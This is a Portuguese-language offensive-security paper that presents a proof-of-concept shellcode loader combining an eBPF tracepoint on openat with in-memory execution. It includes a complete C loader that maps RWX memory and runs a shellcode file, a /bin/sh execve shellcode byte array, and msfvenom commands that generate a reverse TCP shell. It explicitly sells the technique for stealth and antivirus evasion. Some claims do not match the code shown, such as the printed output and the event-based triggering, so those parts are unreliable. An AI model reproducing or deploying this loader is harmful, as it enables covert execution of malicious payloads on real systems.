---
title: "Shellcode Loader with eBPF"
author: "slayer"
---

# Introdução

Nos ultimos anos, o Extended Berkeley Packet Filter (**eBPF**) emergiu como uma tecnologia bem poderosa dentro do **kernel** linux, permitidno a execução efeciente e segura de softwares customizados diretamente no **kernel**, sem a necessidade de modificar seu codigo fonte. Originalmente criado para o sniffing de pacotes, o **eBPF** evoluiu para uma plataforma de observabilidade, segurança e automação altamente versátil.

Em paralelo, o **shellcode** se mantém como uma técnica clássica e ainda sim extremamente relevante dentro do "arsenal". Shellcodes são trechos compactados de código em machine lang que realizam uma ação especifica, frequentemente usada para obter shells remotos, escalar privilegios ou explorar falhas.

Neste paper, exploramos a integração entre **eBPF** e **shellcode** loaders, um campo pouco explorado. A ideia é utilizar o **eBPF** para monitorar eventos do sistema (como as famosas syscalls) e a partir disso, realizar um processo de execução de **shellcode** diretamente na memória no **user-land**. Essa abordagem fornece um meio altamente stealth de executar codigos maliciosos, aproveitando do baixo overhead do **eBPF** e da dificuldade de detecção de shellcodes injetados dinamicamente

A proposta deste paper é demonstrar uma prova de conceito funcional de como isso pode ser feito, explicando cada parte do processo!

---

# 1 - Objetivo

Este paper tem como objetivo principal demonstrar uma abordagem prátiac para a integração do **kernel**-land e o **user-land**, através de dois pontos centrais:

- Interceptação de syscalls com **eBPF** -> codar um programa **eBPF** anexado a um **tracepoint** do **kernel** para capturar eventos especificos, neste caso, a **syscall** `openat()`. Isso permnite monitorar em tempo real a atividade do ssitema, sem impacto significativo do desempenho, e com isolamento garantido pela sandbox do **eBPF**

- Carregamento e execução do **shellcode** em memória no **user-land**: após a ativação via event **kernel**, o programa em **user-land** é responsável por carregar um **shellcode** previamente compilado para a arquitetura `x64_86` em uma região executável da memória, usando o `mmap()` (mais pra frente, neste mesmo paper, vamos falar mais sobre ela). O **shellcode** então é executado diretamente na memória, dispensando a necessidade de arquivos temporários ou outros artefatos detectáveis

---

# 2 - Fundamentos

## 2.1 - **eBPF**

O **eBPF** (Extended Berkeley Packet Filter) é uma tecnologia do **kernel** linux que permite a execução segura de programas bytecode dentro do próprio **kernel**, de forma isolada e controlada. Originalmente projetado para filtragem de pacotes de rede, o **eBPF** evoluiu para uma plataforma generalizada capaz de monitorar e alterar o comportamento do sistema operacional em tempo real, sem necessidade de modificar ou reiniciar o **kernel**

Os programas **eBPF** são escritos em uma linguagem restrita (normalmente C compilado para bytecode BPF via LLVM/Clang) e carregados no **kernel** usando a interface `bpf()` ou libs como a `libbpf`. Antes da execução, esse bytecode passa por um processo rigoroso de verificação para garantir que ele não cause instabilidade ou comprometa o **kernel** (por exemplo verificando loops infinitos ou acessos invalidos na memória)

Os programas **eBPF** podem ser anexados a diversos pontos do **kernel**, como tracepoints, kprobes, uprobes, cgroups, sockets e etc.. permitindo a captura e manipulação de eventos do sistema!

### tracepoints (sys_enter_openat no caso)

No exemplo deste paper, utilizamos um **tracepoint** no **kernel** chamado `sys_enter_openat`, que é disparado toda vez que um processo executa a **syscall** `openat()`. Esse **tracepoint** fornece acesso aos argumentos da **syscall** (como o caminho do arquivo que está sendo aberto) no momento da invocação

Anexar um programa **eBPF** a esse **tracepoint** permite interceptar essas informações de forma eficiente e segura, possibilitando, por exemplo, monitoramento detalhado de atividades de arquivos em tempo real!

### Isolamento do **eBPF**

O ambiente **eBPF** roda em sandbox, sem acesso direto a estruturas criticas do **kernel**, então isso reduz o risco de falhas e mantém a estabilidade do sistema, enquanto permite que ferramentas monitorem e interajam com o **kernel** de forma segura e eficaz

## 2.2 - Shellcode

Shellcode é um pedaço de código que faz algo específico quando executado, geralmente usado em exploits para abrir um shell, executar comandos ou baixar payloads. Apesar do nome, nem todo **shellcode** abre um shell. Ele pode apenas criar arquivos, conectar em rede ou executar qualquer instrução válida

### Como caralhos ele é executado?

O **shellcode** geralmente é injetado e executado em memória, então o processo é basicamente:

- 1 -> alocar memoria com permissão de execução (por exemplo: `mmap()` ou `malloc()` + `mprotect()`)
- 2 -> copiar o **shellcode** para essa memoria
- 3 -> criar uma função que aponta para o **shellcode** e chamar ela

Bom, para exemplificar, aqui está um codigo em C bem simples que invoca uma shell sh por meio de um **shellcode**:


```c
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = {
  0x48, 0x31, 0xc0, 0x48, 0x89, 0xc2, 0x48, 0x89, 0xc6, 0x48, 0x8d, 0x3d, 0x04, 0x00, 0x00, 0x00, 0xb0, 0x3b, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00
};

int main() {
    void *mem = mmap(NULL, 4096,
    PROT_READ | PROT_WRITE | PROT_EXEC,
    MAP_ANON | MAP_PRIVATE, -1, 0);
    memcpy(mem, shellcode, sizeof(shellcode));
    ((void(*)())mem)();
}

```




#### Geração com o msfvenom:

Uma forma prática e rapida de gerar shellcodes é com o msfvenom, do metasploit, aqui vou deixar uns exemplos de como gerar shellcodes pelo msfvenom:

gerar **shellcode** para uma reverse shell em x86_64;

### Arquivo:"bash" 

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f c
```




isso gera o **shellcode** em formato C para ser copiado direto no código, mas você também pode gerar um **shellcode** "puro" em binário desta forma:


### Arquivo:"bash" 

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f raw -o pwnbuffer.bin
```




## 2.3 - Integração com loader

Agora, levantamos uma questão: por que usar `mmap()` com `PROT_EXEC`? De forma direta, precisamos de uma região de memoria que possa executar código. O `mmap()` com `PROT_READ | PROT_WRITE | PROT_EXEC` permite alocar espaço onde copiamos o **shellcode** e conseguimos executar ele direto na RAM!

**eBPF** exige que seus mapas e programas sejam travados na memória (sem swap), então o papel do `RLIMIT_MEMLOCK` é definir quanto de memória o processo pode travar, se for muito baixo, o `bpf()` falha com `EPERM`, por isso, aumetamos esse limite com:


```C
struct rlimit r = {RLIM_INFINITY, RLIM_INFINITY};
setrlimit(RLIMIT_MEMLOCK, &r);
```




Sem isso, o loader nem carrega o **eBPF**.

---

# 3 - Implementação

## 3.1 - Code **eBPF** (**kernel**-land)

O seguinte code em C define o programa **eBPF** que será carregado no **kernel** e anexado ao **tracepoint** `sys_enter_openat`. Esse **tracepoint** é acionado sempre que um processo executa a **syscall** `openat()` usada internamente por funções como `open()` e `fopen()`
 

```C
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/ptrace.h>
#include <linux/types.h>
#include <linux/stat.h>

struct trace_event {
    __u64           pad;
    int             dfd;
    const char     *filename;
    int             flags;      
    __u32           mode;
};

char LICENSE[] SEC("license") = "GPL";

SEC("tracepoint/syscalls/sys_enter_openat")
int trace_openat(struct trace_event *ctx)
{
    char first_byte = 0;
    bpf_probe_read_user(&first_byte,
                       sizeof(first_byte),
                       ctx->filename);

    bpf_printk("PWNED!! %c\n", first_byte);
    return 0;
}
```




"O que o código faz?"
- intercepta chamadas para a `openat()`
- lê o primeiro caractere do nome do arquivo sendo aberto
- usa `bpf_printk**()` para registrar no `/sys/**kernel**/debug/tracing/**trace_pipe`

Então, isso permite monitorar em tempo real o que está sendo acessado pelo sistema sem hooks invasivos!

## 3.2 - Code loader (**user-land**)

O loader é o programa em **user-land** responsável por carregar o **eBPF** no **kernel**, e logo após, carregar e executar um **shellcode** diretamente da memória! Aqui está o código do loader em C:


```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>

static void bump_memlock_rlimit(void)
{
    struct rlimit r = { RLIM_INFINITY, RLIM_INFINITY };
    if (setrlimit(RLIMIT_MEMLOCK, &r)) {
        perror("setrlimit(RLIMIT_MEMLOCK)");
        exit(1);
    }
}

static void *load_shellcode(const char *path)
{
    FILE *f = fopen(path, "rb");
    if (!f) {
        perror("fopen(shellcode)");
        exit(1);
    }
    fseek(f, 0, SEEK_END);
    size_t size = ftell(f);
    rewind(f);

    void *mem = mmap(NULL,
                     size,
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_ANONYMOUS | MAP_PRIVATE,
                     -1, 0);
    if (mem == MAP_FAILED) {
        perror("mmap");
        fclose(f);
        exit(1);
    }

    if (fread(mem, 1, size, f) != size) {
        perror("fread(shellcode)");
        munmap(mem, size);
        fclose(f);
        exit(1);
    }
    fclose(f);
    return mem;
}

int main(int argc, char **argv)
{
    struct bpf_object *obj;
    struct bpf_program *prog;
    struct bpf_link *link;
    int err;

    bump_memlock_rlimit();
    obj = bpf_object__open_file("ebpf_prog.o", NULL);
    if (!obj) {
        fprintf(stderr, "Error: Failed to open ebpf_prog.o\n");
        return 1;
    }
    err = bpf_object__load(obj);
    if (err) {
        fprintf(stderr, "Error: Failed to load eBPF object: %d\n", err);
        return 1;
    }

    bpf_object__for_each_program(prog, obj) {
        link = bpf_program__attach(prog);
        if (!link) {
            fprintf(stderr, "Error: Failed to attach eBPF program\n");
            return 1;
        }
    }

    printf("[+] eBPF loading and attached (tracepoint/syscalls:sys_enter_openat)\n");
    void (*shellcode_func)() = load_shellcode("shellcode.bin");
    printf("[+] Executing shellcode in memory...\n");
    shellcode_func();

    return 0;
}
```




Mass.. o que o loader faz?
- remove limitações de lock de memória que poderiam impedir o carregamento do **eBPF**
- carrega o arquivo compilado `ebpf_prog.o` com a função `bpf_object__open_file()`
- anexa o **eBPF** no **tracepoint** `sys_enter_openat` via `bpf_program__attach()`
- carrega o **shellcode** binário de um arquivo com o `mmap()` e permissões `PROT_EXEC`
- e por fim, executa o **shellcode** imediatamente da memória

Enfim, o resultado, se tudo ocorrer bem, o terminal exibirá algo como:


```sh
[+] eBPF loading and attached (tracepoint/syscalls:sys_enter_openat)
[+] Executing shellcode in memory...
PWNED BY SLAYER%
```




Enfim, vou disponibilizar o meu github com o repositorio no final deste paper, para mais informações, junto com auxilio de execução e afins, de uma olhada no repo dele! 

---

# 4 - Análise de Segurança

A utilização do **eBPF** como ferramenta para carregamento e execução de shellcodes representa uma abordagem bem inovadora dentro da área de offsec. Ao emparelhar o space exec do **kernel** com técnicas comuns de injeção e execução de código arbitrário, o pentester ganha uma forma sofisticada de alcançar seus objetivos com discrição e eficiência. No entanto, essa abordagem vem acompanhada de limitações que precisam ser entendidas antes de sua aplicação prática!

## Vantagens:

- 1 - Execução direta da memória: o **shellcode** é lido diretamente de um arquivo binário (`**shellcode**.bin`) e mapeado para a memória utilizando a função `mmap()` com permissões `PROT_EXEC`. Isso significa que o código nunca toca o disco em formato executável, reduzindo consideravelmente a chance de ser detectado por antivírus tradicionais ou por ferramentas que monitoram arquivos executáveis temporários. Além disso, o **shellcode** é executado através de uma chamada direta (ponteiro de função), o que evita o uso de syscalls comuns (como `execve`) para iniciar um novo processo, dificultando sua identificação por ferramentas que monitoram syscalls.

- 2 - Menor footprint: o loader em **user-land** é extremamente simples e pequeno. Ele apenas carrega o programa **eBPF** e mapeia o **shellcode** na memória. Isso significa que o binário pode passar despercebido em varreduras heurísticas, uma vez que sua estrutura não contém funções comuns de malware, como comunicação de rede, strings embutidas suspeitas ou chamadas de API incomuns.

- 3 - Stealth via **kernel**-land: utilizar **eBPF** como ponto de entrada significa que o **kernel** está cooperando na execução, sem a necessidade de técnicas mais óbvias como o `LD_PRELOAD`, injeção por `ptrace`, ou modificações em libs do usuário. Além disso, interceptar syscalls (como `openat`) via **tracepoint** permite que ações legítimas do usuário (como abrir arquivos no terminal) sirvam como gatilhos naturais para a ativação do **shellcode**.

## Limitações:

- 1 - Permissões elevadas (**root**): para carregar programas **eBPF** e manipular `RLIMIT_MEMLOCK`, é necessário ser **root** ou ter capacidades como `CAP_SYS_ADMIN`. Isso limita o uso em ambientes reais, onde a escalada de privilégio já deve ter ocorrido.

- 2 - Visibilidade no `trace_pipe`: mesmo que o payload seja discreto, o uso de `bpf_printk**()` envia mensagens para `/sys/**kernel**/debug/tracing/**trace_pipe`. Se um analista estiver monitorando o `trace_pipe`, ele pode ver as strings e identificar a atividade.

- 3 - Dependência de recursos do sistema: o loader depende de headers específicos do **kernel** e da `libbpf`, o que pode gerar problemas de compatibilidade ou facilitar a detecção em ambientes protegidos.

---

# Conclusão!

A combinação entre **eBPF** e **shellcode** loaders demonstra como é possível aproveitar mecanismos mais avançados do **kernel** linux para executar código de forma discreta e controlada. Com o **eBPF**, interceptamos chamadas de sistema diretamente no **kernel**, ativando rotinas personalizadas sem modificar arquivos no disco ou depender de hooks tradicionais. Ao carregar o **shellcode** em memória com o `mmap` e permissões de execução, garantimos que a execução ocorra inteiramente no **user-land**, sem deixar rastros evidentes no sistema. Essa técnica oferece vantagens como menor footprint, execução direta da memória e ativação baseada em eventos REAIS do sistema. Apesar de exigir permissões elevadas como **root**, e poder ser monitorada com ferramentas apropriadas, ela exemplifica o potencial do **eBPF** não apenas como ferramenta de observabilidade e segurança, mas também como mecanismo para automação e controle de fluxos de execução

---

### Source github

* [ebpf_loader - github](https://github.com/slayerkkkk/ebpf_loader)

### Fontes utilizadas para construir este artigo

* [Linux Kernel Documentation - **eBPF**](https://docs.**kernel**.org/bpf/index.html)
* [bpf(2) - Linux **syscall** manual](https://man7.org/linux/man-pages/man2/bpf.2.html)
* [**libbpf**: BPF CO-RE reference and usage](https://github.com/**libbpf**/**libbpf**)
* [tracepoints in **eBPF** - Brendan Gregg](http://www.brendangregg.com/blog/2019-01-01/learn-ebpf-tracing.html)
* [Understanding Tracepoints — Kernel docs](https://docs.**kernel**.org/trace/tracepoints.html)
* [RLIMIT\_MEMLOCK - getrlimit(2)](https://man7.org/linux/man-pages/man2/getrlimit.2.html)
* [**mmap**(2) - Memory mapping](https://man7.org/linux/man-pages/man2/**mmap**.2.html)
* [ptrace(2) and ptrace-based introspection](https://man7.org/linux/man-pages/man2/ptrace.2.html)
* [**eBPF** Security Model (LWN)](https://lwn.net/Articles/740157/)
* [The **eBPF** Handbook (by Quentin Monnet)](https://ebpf.io/what-is-ebpf/)